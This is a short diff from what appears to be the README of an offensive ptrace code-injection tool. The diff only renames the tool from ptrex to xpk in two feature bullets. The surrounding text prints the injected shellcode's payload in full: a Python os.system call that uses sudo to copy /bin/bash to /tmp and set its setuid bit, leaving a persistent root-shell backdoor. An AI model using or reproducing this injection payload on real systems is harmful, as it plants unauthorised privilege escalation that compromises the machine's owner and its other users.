@@ -28,8 +28,8 @@ gcc -o xpk xpk.c
 
 WARNING: only works for x86_64 systems (ptrace_do limitation)
 
-* can inject code from x86_64-ptrex-compiled to x86_64 process
-* can inject code from x86_64-ptrex-compiled to x86 process
+* can inject code from x86_64-xpk-compiled to x86_64 process
+* can inject code from x86_64-xpk-compiled to x86 process
 
 ## ptrex.c:
 shellcode injection (using ptrace) execve(python -c import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1")); 
